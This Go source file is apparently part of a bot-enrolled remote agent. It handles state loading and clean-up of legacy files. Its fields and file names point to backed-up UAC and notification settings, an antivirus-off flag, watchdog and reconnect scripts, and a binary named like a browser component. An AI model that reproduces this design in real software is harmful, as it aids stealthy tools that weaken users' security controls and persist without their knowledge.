package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

type agentState struct {
	Enroll    string `json:"enroll,omitempty"`
	BotBase   string `json:"bot_base,omitempty"`
	Token     string `json:"token,omitempty"`
	PublicURL string `json:"public_url,omitempty"`
	NotifyBak string `json:"notify_bak,omitempty"`
	UACBak    string `json:"uac_bak,omitempty"`
}

func loadState() agentState {
	st := readStateStore()
	if st.Enroll == "" {
		st.Enroll = strings.TrimSpace(os.Getenv("AGENTSHE_ENROLL"))
	}
	if st.BotBase == "" {
		st.BotBase = strings.TrimRight(strings.TrimSpace(os.Getenv("AGENTSHE_BOT_BASE")), "/")
	}
	migrateLegacyFiles(&st)
	return st
}

func saveState(st agentState) {
	writeStateStore(st)
}

func migrateLegacyFiles(st *agentState) {
	tryRead := func(path string) string {
		b, err := os.ReadFile(path)
		if err != nil {
			return ""
		}
		return strings.TrimSpace(string(b))
	}
	if st.Enroll == "" || st.BotBase == "" {
		if b := tryRead(configPath); b != "" {
			var cfg map[string]string
			if json.Unmarshal([]byte(b), &cfg) == nil {
				if st.Enroll == "" {
					st.Enroll = strings.TrimSpace(cfg["enroll"])
				}
				if st.BotBase == "" {
					st.BotBase = strings.TrimRight(strings.TrimSpace(cfg["bot_base"]), "/")
				}
			}
		}
	}
	if st.Token == "" {
		st.Token = tryRead(tokenPath)
	}
	if st.PublicURL == "" {
		st.PublicURL = tryRead(urlPath)
	}
	if st.NotifyBak == "" {
		st.NotifyBak = tryRead(filepath.Join(dir, "notify-backup.json"))
	}
	if st.UACBak == "" {
		st.UACBak = tryRead(filepath.Join(dir, "uac-backup.json"))
	}
	writeStateStore(*st)
	for _, name := range []string{
		"config.json", "token", "public_url", "agent.log", "boot.log", "agent.lock",
		"notify-backup.json", "uac-backup.json", "restore-security.ps1",
		"watchdog.vbs", "reconnect.vbs", "watchdog.lock", "watchdog.sh", "reconnect.sh",
		"instance.lock", ".av-off", "out.log", "err.log",
	} {
		_ = os.Remove(filepath.Join(dir, name))
	}
	if runtime.GOOS == "windows" {
		_ = os.Remove(filepath.Join(dir, "EdgeRelay.exe"))
	} else {
		_ = os.Remove(filepath.Join(dir, "EdgeRelay"))
	}
}
